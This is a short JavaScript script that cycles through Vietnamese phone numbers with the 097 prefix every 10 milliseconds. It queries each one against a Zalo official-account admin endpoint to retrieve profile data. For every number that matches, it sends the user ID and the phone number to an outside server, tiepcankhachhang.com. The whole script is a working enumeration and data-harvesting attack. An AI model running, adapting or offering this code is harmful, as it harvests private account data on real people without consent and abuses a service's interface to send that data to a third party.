function load(phone) {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {
      var obj = JSON.parse(xhttp.responseText);
      if(obj.err == 0)
      {
      	var xhttpz = new XMLHttpRequest();
		xhttpz.open("GET", "http://tiepcankhachhang.com/zid/zid.php?zid="+obj.data.userid+"&phone="+phone, true);
		xhttpz.send();
      }
    }
  };
  xhttp.open("POST", "http://oa.zalo.me/manage/mnadmin", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
  xhttp.send("option=profile&phone=" + phone);
}
var header = '097';
var i = 1000000;
function timeout() {
    setTimeout(function () {
        load(header +''+i);
        i++;
        timeout();
    }, 10);
}
timeout();